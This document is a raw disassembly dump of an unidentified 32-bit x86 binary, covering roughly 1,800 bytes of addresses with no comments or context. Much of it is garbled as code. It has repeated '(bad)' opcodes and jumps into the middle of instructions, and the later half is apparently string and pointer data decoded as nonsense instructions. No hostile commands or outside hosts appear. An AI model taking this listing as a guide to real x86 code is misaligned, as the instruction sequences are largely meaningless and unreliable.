  4341d6:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4341dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4341e0:	mov    ecx,edi
  4341e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4341e8:	jb     0x4341f9
  4341ea:	add    BYTE PTR [edi-0x3f],dl
  4341ed:	add    BYTE PTR [ebp-0x75],cl
  4341f0:	mov    esi,eax
  4341f2:	xor    eax,DWORD PTR [eax]
  4341f4:	mov    al,bh
  4341f6:	or     eax,0x497284
  4341fb:	xor    al,cl
  4341fd:	mov    ecx,DWORD PTR [ebp-0x4]
  434200:	mov    ecx,edi
  434202:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434208:	jb     0x434219
  43420a:	add    BYTE PTR [edi],dh
  43420c:	enter  0x8500,0x8b
  434210:	add    ah,bl
  434212:	add    BYTE PTR [eax],al
  434214:	inc    ebp
  434215:	(bad)  
  434216:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43421d:	mov    esi,DWORD PTR [edx-0x4]
  434220:	add    bh,cl
  434222:	dec    ebp
  434223:	mov    dh,0x8b
  434225:	add    esi,DWORD PTR [ebx]
  434227:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43422d:	add    BYTE PTR [eax],al
  43422f:	mov    eax,ecx
  434231:	loopne 0x434280
  434233:	add    BYTE PTR [ebx-0x757bcc39],cl
  434239:	dec    ecx
  43423a:	or     eax,0x8b7232
  43423f:	in     al,0xc1
  434241:	or     DWORD PTR [ebp-0x31],ecx
  434244:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  43424b:	xor    dh,BYTE PTR [edx-0x75]
  43424e:	add    al,dh
  434250:	enter  0x4f09,0xcf
  434254:	inc    ebp
  434255:	mov    WORD PTR [ebx-0x75cdccb7],cs
  43425b:	or     al,BYTE PTR ds:0xe4728b
  434261:	or     DWORD PTR [ebp-0x31],ecx
  434264:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  43426b:	cmp    dh,BYTE PTR [edx+0xf]
  43426e:	add    bl,dl
  434270:	rol    DWORD PTR [eax],0x4d
  434273:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  434279:	(bad)  
  43427a:	or     eax,0x497284
  43427f:	xor    al,cl
  434281:	mov    ecx,DWORD PTR [ebp-0x20]
  434284:	mov    ecx,DWORD PTR [ecx]
  434286:	xor    ecx,edi
  434288:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43428f:	xor    cl,al
  434291:	mov    ecx,DWORD PTR [edi]
  434293:	fadd   QWORD PTR [ebp+0x9]
  434296:	call   0xffd03d6a
  43429b:	dec    ecx
  43429c:	dec    ebp
  43429d:	xor    bh,BYTE PTR [ebx]
  43429f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4342a3:	loopne 0x4342a1
  4342a5:	or     edi,eax
  4342a7:	iret   
  4342a8:	ret    
  4342a9:	mov    WORD PTR [ebp+0x4d],es
  4342ac:	mov    esi,DWORD PTR [edx]
  4342ae:	call   0x845309ed
  4342b3:	(bad)  
  4342b4:	cdq    
  4342b5:	add    BYTE PTR [edx],dh
  4342b7:	mov    esi,DWORD PTR [ebx]
  4342b9:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4342bf:	test   BYTE PTR [ebx],dh
  4342c1:	dec    ecx
  4342c2:	add    esi,DWORD PTR [edx]
  4342c4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4342ca:	dec    edi
  4342cc:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  4342d3:	xor    al,BYTE PTR [ebx]
  4342d5:	mov    edi,DWORD PTR [ebx]
  4342d7:	in     al,0x75
  4342d9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4342df:	dec    ecx
  4342e0:	xor    esi,DWORD PTR [edx]
  4342e2:	lea    ecx,[edx]
  4342e4:	or     BYTE PTR [ebx+0x900f072],cl
  4342ea:	ja     0x4342bb
  4342ec:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  4342f3:	cmp    ch,al
  4342f5:	jne    0x4342ea
  4342f7:	mov    edi,edi
  4342f9:	fadd   QWORD PTR [ebp+0x0]
  4342fc:	mov    eax,edi
  4342fe:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434305:	mov    edx,DWORD PTR [ebx]
  434307:	in     al,0x45
  434309:	or     DWORD PTR [ebx],esi
  43430b:	iret   
  43430c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434313:	xor    dl,BYTE PTR [eax-0x75]
  434316:	sbb    al,0xe0
  434318:	dec    DWORD PTR [ecx]
  43431a:	mov    ecx,edi
  43431c:	in     al,dx
  43431d:	mov    eax,es
  43431f:	dec    ecx
  434320:	mov    DWORD PTR [edx],esi
  434322:	fmul   QWORD PTR [edx]
  434324:	jne    0x4342b1
  434326:	(bad)  
  434327:	(bad)  
  434329:	or     DWORD PTR [ebp-0x31],eax
  43432c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  434333:	cmp    bh,bh
  434335:	jne    0x43437c
  434337:	lea    ecx,[ebx-0x38372750]
  43433d:	inc    ebx
  43433f:	mov    eax,ecx
  434341:	mov    eax,0xa00c111
  434346:	jne    0x43438d
  434348:	mov    esi,DWORD PTR [ebx]
  43434a:	test   al,0x3
  43434c:	inc    ebp
  43434d:	mov    DWORD PTR [eax-0xc],edx
  434350:	loop   0x434397
  434352:	push   DWORD PTR [ebx]
  434354:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43435a:	add    DWORD PTR [eax],eax
  43435c:	mov    eax,edi
  43435e:	lods   al,BYTE PTR ds:[esi]
  43435f:	dec    ebp
  434360:	inc    ebp
  434361:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  434367:	retf   
  434368:	mov    edx,ecx
  43436a:	adc    al,0x84
  43436c:	(bad)  
  43436d:	std    
  43436e:	ret    
  43436f:	jmp    FWORD PTR [edi-0x2b7474bb]
  434375:	hlt    
  434376:	rol    edi,0x82
  434379:	ret    
  43437a:	cld    
  43437b:	enter  0x11ff,0x45
  43437f:	inc    ebp
  434380:	pop    edi
  434381:	mov    ebx,DWORD PTR [ebx+0x14]
  434384:	ret    0xc7
  434387:	test   BYTE PTR [ebx+0x45325199],cl
  43438d:	jmp    0x43431a
  43438f:	push   0x8
  434391:	call   DWORD PTR [esi]
  434393:	in     al,dx
  434394:	add    BYTE PTR [ebp+0x1],0x50
  434398:	add    bh,ah
  43439a:	add    bh,bh
  43439c:	icebp  
  43439d:	mov    ecx,DWORD PTR [eax]
  43439f:	cld    
  4343a0:	pop    es
  4343a1:	dec    ebp
  4343a2:	shl    DWORD PTR [ebx],0x72
  4343a5:	add    eax,DWORD PTR [eax]
  4343a7:	cmp    edx,ecx
  4343a9:	je     0x4343bb
  4343ab:	mov    esi,DWORD PTR [ebp-0x4]
  4343ae:	inc    edi
  4343b0:	or     al,0xc3
  4343b2:	jmp    FWORD PTR [edx-0x18]
  4343b5:	(bad)  
  4343b6:	sti    
  4343b7:	cwde   
  4343b8:	(bad)  
  4343b9:	call   0xffa13cc4
  4343be:	or     al,0x45
  4343c0:	push   ebp
  4343c1:	sub    esp,0x18
  4343c4:	push   ebx
  4343c5:	inc    ebp
  4343c6:	mov    edi,edi
  4343c8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4343cf:	test   al,0x51
  4343d1:	inc    ebp
  4343d2:	push   ecx
  4343d3:	push   eax
  4343d4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4343da:	add    ah,bh
  4343dc:	(bad)  
  4343dd:	dec    ebp
  4343de:	add    DWORD PTR [ebx],esi
  4343e0:	inc    ebp
  4343e1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4343e7:	push   0xffffff8b
  4343e9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4343ef:	add    eax,DWORD PTR [ecx]
  4343f1:	or     BYTE PTR [eax],al
  4343f3:	call   0xff853bf8
  4343f8:	mov    eax,DWORD PTR [ebp+0x14]
  4343fb:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434401:	inc    ebp
  434402:	dec    ecx
  434403:	add    ebp,DWORD PTR [edx+0x14]
  434406:	push   0x8b3045
  43440b:	call   0x33ad9180
  434410:	inc    DWORD PTR [ebx]
  434412:	mov    DWORD PTR [edi],ecx
  434414:	mov    eax,ecx
  434416:	or     BYTE PTR [ebp-0x3d],cl
  434419:	cmp    eax,edi
  43441b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  434420:	adc    BYTE PTR [ebx+0x5eff0845],cl
  434426:	adc    al,0xc9
  434428:	inc    ebp
  434429:	adc    BYTE PTR [eax+0x55],dl
  43442c:	jne    0x43441a
  43442e:	call   0xff5443be
  434433:	dec    ebp
  434434:	inc    ebp
  434435:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43443b:	add    BYTE PTR [ebx],bh
  43443d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  434441:	push   ecx
  434442:	or     al,0x51
  434444:	dec    ebp
  434445:	xor    DWORD PTR [ebx],0xf320399
  43444b:	cmp    eax,DWORD PTR [ebp+0x74]
  43444e:	mov    edi,edi
  434450:	pop    edi
  434451:	adc    BYTE PTR [ebx+0x75],bl
  434454:	ret    0x50
  434457:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43445b:	(bad)  
  43445c:	clc    
  43445d:	mov    esp,ebp
  43445f:	pop    ecx
  434460:	mov    ecx,0xf80085c2
  434465:	mov    ecx,DWORD PTR [ecx+edx*2]
  434468:	push   esi
  434469:	push   esi
  43446a:	(bad)  
  43446b:	lock add eax,DWORD PTR [ebp+0x44]
  43446f:	mov    edx,DWORD PTR [eax]
  434471:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  434475:	or     BYTE PTR [ecx+0x7],dl
  434478:	push   ecx
  434479:	ret    
  43447a:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434480:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434486:	or     al,0x80
  434488:	jge    0x43448b
  43448a:	mov    DWORD PTR [eax],eax
  43448c:	and    al,0x8
  43448e:	cmp    DWORD PTR [ebp+0x10],eax
  434491:	mov    edx,DWORD PTR [esi]
  434493:	xchg   esp,eax
  434494:	dec    esp
  434495:	add    BYTE PTR [eax],dl
  434497:	mov    ecx,edx
  434499:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43449d:	dec    ebp
  43449e:	into   
  43449f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4344a5:	mov    edx,DWORD PTR [eax+0x14]
  4344a8:	das    
  4344a9:	add    al,0x45
  4344ab:	add    BYTE PTR [ebp+0x0],dh
  4344ae:	mov    edi,edi
  4344b0:	and    al,0x50
  4344b2:	mov    eax,DWORD PTR [eax]
  4344b4:	and    al,0xd1
  4344b6:	xor    eax,DWORD PTR [esi]
  4344b8:	lea    eax,[ebp+0x8]
  4344bb:	xor    esi,DWORD PTR [edx+0x3]
  4344be:	add    BYTE PTR [ecx+0x4510fc44],cl
  4344c4:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  4344ca:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4344d4:	cmp    edi,edi
  4344d6:	pushf  
  4344d7:	mov    edi,edi
  4344d9:	or     BYTE PTR [esi+ecx*1],cl
  4344dc:	jne    0x4344a1
  4344de:	call   0xc44aa
  4344e3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4344e7:	mov    ebx,DWORD PTR [eax]
  4344e9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4344ed:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4344f5:	pop    esi
  4344f6:	(bad)  
  4344f7:	leave  
  4344f8:	call   DWORD PTR [eax]
  4344fa:	call   DWORD PTR [ebp+0x24]
  4344fd:	in     al,dx
  4344fe:	jmp    esp
  434500:	and    al,0x83
  434502:	call   0xff7a4317
  434507:	pushf  
  434508:	inc    esp
  434509:	mov    DWORD PTR [esp],ecx
  43450c:	pop    esi
  43450d:	push   edi
  43450e:	in     eax,0x41
  434510:	ret    0x89
  434513:	and    al,0xe
  434515:	mov    edi,DWORD PTR [eax]
  434517:	and    al,0x75
  434519:	mov    edx,0x7750885
  43451e:	or     dl,bh
  434520:	call   FWORD PTR [ecx+0x3243224]
  434526:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  43452c:	dec    DWORD PTR [esp]
  43452f:	jl     0x4344bc
  434531:	adc    al,0xc
  434533:	dec    ebp
  434534:	cmp    DWORD PTR [ebp+0x1c],esi
  434537:	mov    ecx,DWORD PTR [eax]
  434539:	and    al,0x10
  43453b:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  434542:	test   DWORD PTR [edi],ecx
  434544:	jge    0x434510
  434546:	push   0x8908ff4c
  43454b:	jmp    0x434571
  43454d:	adc    BYTE PTR [esp+eax*2-0x75],dh
  434551:	dec    esp
  434552:	pop    ebp
  434553:	ret    0x8999
  434556:	push   0x74f89cf8
  43455b:	jmp    0x4345d1
  43455d:	mov    edi,0x104fd55f
  434562:	add    BYTE PTR [eax],dh
  434564:	adc    BYTE PTR ds:[eax],al
  434567:	or     edx,DWORD PTR gs:[eax]
  43456a:	add    BYTE PTR [ecx],ch
  43456c:	add    eax,0x35270010
  434571:	adc    BYTE PTR [eax],al
  434573:	std    
  434574:	dec    eax
  434575:	adc    BYTE PTR [eax],al
  434577:	(bad)  
  434578:	outs   dx,BYTE PTR ds:[esi]
  434579:	adc    BYTE PTR [eax],al
  43457b:	sahf   
  43457c:	xor    DWORD PTR [eax],edx
  43457e:	add    BYTE PTR [esi+0x0],al
  434581:	adc    BYTE PTR [eax],al
  434583:	fs jae 0x434596
  434586:	add    BYTE PTR [ebx+0x5f001054],bh
  43458c:	inc    ebp
  43458d:	inc    ebx
  43458e:	add    BYTE PTR [ebx+0x45],ah
  434591:	inc    ebx
  434592:	add    BYTE PTR [edi+0x45],ah
  434595:	inc    ebx
  434596:	add    BYTE PTR [ebx+0x45],ch
  434599:	inc    ebx
  43459a:	add    BYTE PTR [edi+0x45],ch
  43459d:	inc    ebx
  43459e:	add    BYTE PTR [ebx+0x45],dh
  4345a1:	inc    ebx
  4345a2:	add    BYTE PTR [edi+0x45],dh
  4345a5:	inc    ebx
  4345a6:	add    BYTE PTR [ebx+0x45],bh
  4345a9:	inc    ebx
  4345aa:	add    BYTE PTR [edi+0x45],bh
  4345ad:	inc    ebx
  4345ae:	add    BYTE PTR [ebx-0x78ffbcbb],al
  4345b4:	inc    ebp
  4345b5:	inc    ebx
  4345b6:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  4345bd:	adc    BYTE PTR [eax],al
  4345bf:	adc    dh,BYTE PTR [ecx+0x10]
  4345c2:	add    BYTE PTR [edi+0x2c001065],al
  4345c8:	push   0x5aa20010
  4345cd:	adc    BYTE PTR [eax],al
  4345cf:	rol    DWORD PTR [eax+edx*1],0x0
  4345d3:	int    0x6f
  4345d5:	adc    BYTE PTR [eax],al
  4345d7:	mov    bh,0x45
  4345d9:	inc    ebx
  4345da:	add    BYTE PTR [ebx-0x40ffbcbb],bh
  4345e0:	inc    ebp
  4345e1:	inc    ebx
  4345e2:	add    bl,al
  4345e4:	inc    ebp
  4345e5:	inc    ebx
  4345e6:	add    bh,al
  4345e8:	inc    ebp
  4345e9:	inc    ebx
  4345ea:	add    bl,cl
  4345ec:	inc    ebp
  4345ed:	inc    ebx
  4345ee:	add    bh,cl
  4345f0:	inc    ebp
  4345f1:	inc    ebx
  4345f2:	add    bl,dl
  4345f4:	inc    ebp
  4345f5:	inc    ebx
  4345f6:	add    BYTE PTR [ebx+0x54001005],dh
  4345fc:	push   ebp
  4345fd:	adc    BYTE PTR [eax],al
  4345ff:	sbb    bh,BYTE PTR [eax]
  434601:	adc    BYTE PTR [eax],al
  434603:	mov    edx,0x2f001013
  434608:	dec    edx
  434609:	adc    BYTE PTR [eax],al
  43460b:	inc    ecx
  43460c:	or     edx,DWORD PTR [eax]
  43460e:	add    BYTE PTR [ebx+0x19],ch
  434611:	adc    BYTE PTR [eax],al
  434613:	mov    esp,0xf700103e
  434618:	inc    ebp
  434619:	inc    ebx
  43461a:	add    bl,bh
  43461c:	inc    ebp
  43461d:	inc    ebx
  43461e:	add    bh,bh
  434620:	inc    ebp
  434621:	inc    ebx
  434622:	add    BYTE PTR [ebx],al
  434624:	inc    esi
  434625:	inc    ebx
  434626:	add    BYTE PTR [edi],al
  434628:	inc    esi
  434629:	inc    ebx
  43462a:	add    BYTE PTR [ebx],cl
  43462c:	inc    esi
  43462d:	inc    ebx
  43462e:	add    BYTE PTR [edi],cl
  434630:	inc    esi
  434631:	inc    ebx
  434632:	add    BYTE PTR [ebx],dl
  434634:	inc    esi
  434635:	inc    ebx
  434636:	add    BYTE PTR [edi-0x27ffef96],ch
  43463c:	imul   edx,DWORD PTR [eax],0x0
  43463f:	sahf   
  434640:	push   ss
  434641:	adc    BYTE PTR [eax],al
  434643:	jle    0x43467f
  434645:	adc    BYTE PTR [eax],al
  434647:	jbe    0x43465e
  434649:	adc    BYTE PTR [eax],al
  43464b:	cmp    DWORD PTR [edi+0x10],edx
  43464e:	add    BYTE PTR [ebp+0x59001066],bl
  434654:	adc    al,0x10
  434656:	add    BYTE PTR [edi],dh
  434658:	inc    esi
  434659:	inc    ebx
  43465a:	add    BYTE PTR [ebx],bh
  43465c:	inc    esi
  43465d:	inc    ebx
  43465e:	add    BYTE PTR [edi],bh
  434660:	inc    esi
  434661:	inc    ebx
  434662:	add    BYTE PTR [ebx+0x46],al
  434665:	inc    ebx
  434666:	add    BYTE PTR [edi+0x46],al
  434669:	inc    ebx
  43466a:	add    BYTE PTR [ebx+0x46],cl
  43466d:	inc    ebx
  43466e:	add    BYTE PTR [edi+0x46],cl
  434671:	inc    ebx
  434672:	add    BYTE PTR [ebx+0x46],dl
  434675:	inc    ebx
  434676:	add    BYTE PTR [ebx-0x6affef90],bh
  43467c:	inc    ebp
  43467d:	adc    BYTE PTR [eax],al
  43467f:	dec    ebx
  434680:	dec    eax
  434681:	adc    BYTE PTR [eax],al
  434683:	dec    ebx
  434684:	popa   
  434685:	adc    BYTE PTR [eax],al
  434687:	adc    al,BYTE PTR [eax+edx*1]
  43468a:	add    dh,dl
  43468c:	push   ds
  43468d:	adc    BYTE PTR [eax],al
  43468f:	hlt    
  434690:	pop    ds
  434691:	adc    BYTE PTR [eax],al
  434693:	dec    ecx
  434694:	pop    eax
  434695:	adc    BYTE PTR [eax],al
  434697:	ja     0x4346df
  434699:	inc    ebx
  43469a:	add    BYTE PTR [ebx+0x46],bh
  43469d:	inc    ebx
  43469e:	add    BYTE PTR [edi+0x46],bh
  4346a1:	inc    ebx
  4346a2:	add    BYTE PTR [ebx-0x78ffbcba],al
  4346a8:	inc    esi
  4346a9:	inc    ebx
  4346aa:	add    BYTE PTR [ebx-0x70ffbcba],cl
  4346b0:	inc    esi
  4346b1:	inc    ebx
  4346b2:	add    BYTE PTR [ebx+0x4d004346],dl
  4346b8:	push   edi
  4346b9:	xor    DWORD PTR [ecx],esi
  4346bb:	cmp    BYTE PTR [edi+ebx*2],dh
  4346be:	push   ecx
  4346bf:	add    BYTE PTR [edx+0x33],dl
  4346c2:	push   esi
  4346c3:	xor    eax,0x3849515f
  4346c8:	xor    al,0x59
  4346ca:	push   edi
  4346cb:	add    BYTE PTR [ebx+0x54],al
  4346ce:	inc    ebp
  4346cf:	pop    edi
  4346d0:	dec    ebx
  4346d1:	push   edx
  4346d2:	push   ebp
  4346d3:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  4346d8:	pop    edi
  4346d9:	aaa    
  4346da:	xor    al,0x32
  4346dc:	xor    BYTE PTR [edi+0x5f],al
  4346df:	inc    ebx
  4346e0:	pop    edx
  4346e1:	add    BYTE PTR [edi+0x4e],al
  4346e4:	cmp    DWORD PTR [edi+0x47],ebx
  4346e7:	push   ebx
  4346e8:	cmp    DWORD PTR [edi+0x4e],edx
  4346eb:	add    BYTE PTR [ecx+0x44],dl
  4346ee:	cmp    BYTE PTR [edi+0x33],bl
  4346f1:	cmp    BYTE PTR [eax],dh
  4346f3:	pop    edi
  4346f4:	inc    ecx
  4346f5:	dec    edi
  4346f6:	inc    esi
  4346f7:	push   eax
  4346f8:	add    BYTE PTR [edx+0x43],dl
  4346fb:	xor    eax,0x41305f30
  434700:	xor    BYTE PTR [esi+0x5f],al
  434703:	inc    ebx
  434704:	xor    dh,BYTE PTR [edx]
  434706:	xor    eax,0x36545200
  43470b:	xor    al,0x5f
  43470d:	dec    esi
  43470e:	xor    esi,DWORD PTR [edx]
  434710:	add    BYTE PTR ss:[eax+0x4b],cl
  434714:	inc    ebx
  434715:	pop    edi
  434716:	ss xor al,0x34
  434719:	pop    edi
  43471a:	inc    ecx
  43471b:	push   esp
  43471c:	dec    edi
  43471d:	add    BYTE PTR [esi+0x52],dl
  434720:	push   esi
  434721:	pop    edi
  434722:	inc    esi
  434723:	push   ecx
  434724:	push   ebp
  434725:	push   edx
  434726:	dec    eax
  434727:	add    BYTE PTR [esi+0x41],cl
  43472a:	inc    edx
  43472b:	pop    edi
  43472c:	xor    DWORD PTR [ecx],edi
  43472e:	push   edi
  43472f:	pop    edi
  434730:	pop    edx
  434731:	xor    eax,0x47003934
  434736:	push   edx
  434737:	push   ebp
  434738:	pop    edi
  434739:	xor    al,BYTE PTR [edx+0x30]
  43473c:	push   ebx
  43473d:	dec    esi
  43473e:	xor    eax,0x38564300
  434743:	xor    al,0x5f
  434745:	xor    bl,BYTE PTR [eax+0x36]
  434748:	inc    edx
  434749:	pop    edi
  43474a:	pop    ecx
  43474b:	xor    al,BYTE PTR [ecx+0x0]
  43474e:	push   edi
  43474f:	dec    ecx
  434750:	push   ebx
  434751:	xor    DWORD PTR [eax],edi
  434753:	pop    edi
  434754:	push   ecx
  434755:	xor    BYTE PTR [edx+0x5f],cl
  434758:	inc    ecx
  434759:	add    BYTE PTR ss:[edx+0x45],al
  43475d:	push   edi
  43475e:	cmp    DWORD PTR [eax],edi
  434760:	pop    edi
  434761:	inc    edx
  434762:	xor    eax,0x36520057
  434767:	aaa    
  434768:	xor    BYTE PTR [edi],dh
  43476a:	pop    edi
  43476b:	inc    edx
  43476c:	cmp    DWORD PTR [edi+0x52],eax
  43476f:	dec    esp
  434770:	pop    edi
  434771:	dec    ebx
  434772:	add    BYTE PTR [esp+edx*2+0x30],al
  434776:	pop    edi
  434777:	push   ebp
  434778:	push   ebx
  434779:	aaa    
  43477a:	dec    ebp
  43477b:	pop    edi
  43477c:	xor    ecx,DWORD PTR [edx+0x4e]
  43477f:	dec    ebx
  434780:	dec    edx
  434781:	add    BYTE PTR [edi+0x47],al
  434784:	xor    eax,0x534e5f32
  434789:	push   esp
  43478a:	pop    edi
  43478b:	push   esp
  43478c:	inc    edx
  43478d:	inc    esi
  43478e:	inc    esp
  43478f:	add    BYTE PTR [ebp+0x4e],al
  434792:	inc    edi
  434793:	cmp    DWORD PTR [edi+0x57],ebx
  434796:	push   eax
  434797:	push   ecx
  434798:	pop    edi
  434799:	dec    edi
  43479a:	inc    ebx
  43479b:	push   edi
  43479c:	pop    edi
  43479d:	inc    edi
  43479e:	add    BYTE PTR [edi+0x45],dl
  4347a1:	inc    esi
  4347a2:	pop    edi
  4347a3:	push   edx
  4347a4:	inc    edx
  4347a5:	pop    eax
  4347a6:	inc    edi
  4347a7:	ss pop edi
  4347a9:	push   esi
  4347aa:	inc    ebx
  4347ab:	dec    esi
  4347ac:	inc    esp
  4347ad:	add    BYTE PTR [edi+0x4d],cl
  4347b0:	inc    edi
  4347b1:	xor    ebx,DWORD PTR [edi+0x34]
  4347b4:	dec    esi
  4347b5:	pop    edx
  4347b6:	cmp    BYTE PTR [edi+0x58],bl
  4347b9:	cmp    BYTE PTR [eax],al
  4347bb:	push   edx
  4347bc:	pop    eax
  4347bd:	push   ecx
  4347be:	pop    edi
  4347bf:	dec    esp
  4347c0:	push   edx
  4347c1:	dec    ecx
  4347c2:	dec    edi
  4347c3:	inc    esp
  4347c4:	pop    edi
  4347c5:	dec    edi
  4347c6:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  4347ca:	push   eax
  4347cb:	inc    ebp
  4347cc:	pop    edi
  4347cd:	xor    eax,0x565f3945
  4347d2:	add    BYTE PTR [edi+0x4e],al
  4347d5:	push   esi
  4347d6:	pop    edi
  4347d7:	inc    edi
  4347d8:	push   esp
  4347d9:	dec    eax
  4347da:	xor    dh,BYTE PTR [ecx]
  4347dc:	pop    edi
  4347dd:	dec    edi
  4347de:	xor    eax,DWORD PTR ss:[eax]
  4347e1:	inc    esp
  4347e2:	inc    ebp
  4347e3:	dec    ecx
  4347e4:	pop    edi
  4347e5:	push   edx
  4347e6:	dec    eax
  4347e7:	xor    al,0x48
  4347e9:	dec    ecx
  4347ea:	ss pop edi
  4347ec:	aaa    
  4347ed:	aaa    
  4347ee:	dec    ecx
  4347ef:	dec    ebp
  4347f0:	add    BYTE PTR [eax+0x54],cl
  4347f3:	ss pop edi
  4347f5:	inc    esi
  4347f6:	inc    edx
  4347f7:	xor    dh,BYTE PTR [eax+eax*1]
  4347fa:	dec    esi
  4347fb:	ss dec edx
  4347fd:	pop    edi
  4347fe:	dec    ecx
  4347ff:	dec    esp
  434800:	inc    edi
  434801:	inc    esp
  434802:	dec    eax
  434803:	xor    BYTE PTR [eax],bh
  434805:	xor    eax,0x34004f00
  43480a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43480e:	add    BYTE PTR [edi],dh
  434810:	add    BYTE PTR [eax],dh
  434812:	add    BYTE PTR [edi+0x0],bl
  434815:	inc    esp
  434816:	add    BYTE PTR [edi+0x0],al
  434819:	dec    ebx
  43481a:	add    BYTE PTR [edx],dh
  43481c:	add    BYTE PTR [ecx+0x0],al
  43481f:	inc    ebx
  434820:	add    BYTE PTR [eax],al
  434822:	add    BYTE PTR [edi+0x0],cl
  434825:	xor    al,BYTE PTR [eax]
  434827:	xor    eax,DWORD PTR [eax]
  434829:	pop    edi
  43482a:	add    BYTE PTR [edi+0x0],dl
  43482d:	xor    al,BYTE PTR [eax]
  43482f:	dec    edi
  434830:	add    BYTE PTR [edi+0x0],bl
  434833:	pop    edx
  434834:	add    BYTE PTR [eax],al
  434836:	add    BYTE PTR [eax+0x0],bl
  434839:	dec    esp
  43483a:	add    BYTE PTR [ecx],bh
  43483c:	add    BYTE PTR [edi+0x0],bl
  43483f:	dec    ebx
  434840:	add    BYTE PTR [ecx+0x0],al
  434843:	dec    edx
  434844:	add    BYTE PTR [esi+0x0],al
  434847:	xor    DWORD PTR [eax],eax
  434849:	xor    al,0x0
  43484b:	pop    edi
  43484c:	add    BYTE PTR [eax+0x0],bl
  43484f:	inc    edi
  434850:	add    BYTE PTR [edx+0x0],al
  434853:	add    BYTE PTR [eax],al
  434855:	push   eax
  434856:	add    BYTE PTR [ebx],dh
  434858:	add    BYTE PTR [esi+0x0],cl
  43485b:	pop    edi
  43485c:	add    BYTE PTR [eax+0x0],cl
  43485f:	xor    eax,0x5f005300
  434864:	add    BYTE PTR [eax+0x0],cl
  434867:	add    BYTE PTR [eax],al
  434869:	dec    ebp
  43486a:	add    BYTE PTR [eax],dh
  43486c:	add    BYTE PTR [edx+0x0],al
  43486f:	pop    edi
  434870:	add    BYTE PTR [edx+0x0],cl
  434873:	pop    eax
  434874:	add    BYTE PTR [eax+eax*1+0x49],dl
  434878:	add    BYTE PTR [eax+eax*1+0x39],cl
  43487c:	add    BYTE PTR [eax+eax*1+0x0],cl
  434880:	add    BYTE PTR [ecx+0x0],al
  434883:	xor    eax,DWORD PTR [eax]
  434885:	xor    BYTE PTR [eax],al
  434887:	pop    edi
  434888:	add    BYTE PTR [ecx+0x0],al
  43488b:	pop    edx
  43488c:	add    BYTE PTR [ecx+0x0],dl
  43488f:	pop    edx
  434890:	add    BYTE PTR [ecx],bh
  434892:	add    BYTE PTR [esi],dh
  434894:	add    BYTE PTR [edi+0x0],bl
  434897:	dec    eax
  434898:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43489c:	add    BYTE PTR [eax],al
  43489e:	add    BYTE PTR [ecx+0x0],dl
  4348a1:	push   edi
  4348a2:	add    BYTE PTR [ecx+0x0],bl
  4348a5:	pop    edi
  4348a6:	add    BYTE PTR [esi+0x0],dl
  4348a9:	xor    al,0x0
  4348ab:	inc    esp
  4348ac:	add    BYTE PTR [ecx],dh
  4348ae:	add    BYTE PTR [eax],bh
  4348b0:	add    BYTE PTR [edx],dh
  4348b2:	add    BYTE PTR [edi+0x0],bl
  4348b5:	cmp    DWORD PTR [eax],eax
  4348b7:	push   esp
  4348b8:	add    BYTE PTR [eax+eax*1+0x0],dl
  4348bc:	add    BYTE PTR [esi+0x0],dl
  4348bf:	dec    edi
  4348c0:	add    BYTE PTR [edi+0x0],al
  4348c3:	add    BYTE PTR ss:[edi+0x0],bl
  4348c7:	dec    edi
  4348c8:	add    BYTE PTR [edx+0x0],bl
  4348cb:	inc    ebp
  4348cc:	add    BYTE PTR [eax],dh
  4348ce:	add    BYTE PTR [ebp+0x0],al
  4348d1:	xor    BYTE PTR [eax],al
  4348d3:	pop    edi
  4348d4:	add    BYTE PTR [eax],dh
  4348d6:	add    BYTE PTR ds:0x4f000000,dh
  4348dc:	add    BYTE PTR ds:0x5f005700,dh
  4348e2:	add    BYTE PTR [edi],dh
  4348e4:	add    BYTE PTR [ebx+0x0],dl
  4348e7:	push   ebp
  4348e8:	add    BYTE PTR [edi+0x0],al
  4348eb:	xor    al,0x0
  4348ed:	pop    edi
